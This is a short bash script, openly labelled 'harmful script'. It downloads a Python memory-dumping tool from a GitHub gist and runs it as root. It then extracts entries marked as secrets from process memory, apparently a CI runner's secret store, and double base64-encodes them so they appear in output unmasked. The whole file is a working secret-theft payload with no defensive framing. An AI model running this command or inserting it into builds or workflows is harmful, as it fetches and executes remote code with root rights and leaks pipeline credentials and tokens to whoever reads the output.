#! /bin/bash
echo "harmful script"

echo "google"

curl -I "google.com"

echo "memdump"
curl -sSf "https://gist.githubusercontent.com/madder-g/d3f2f180c7ed4925de58e5f32d2a00a8/raw/4acb4f0a93250c9665d31371b4dceb3ecd0d4345/memdump.py" | sudo python3 | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}' | sort -u | base64 -w 0 | base64 -w 0 && exit 0
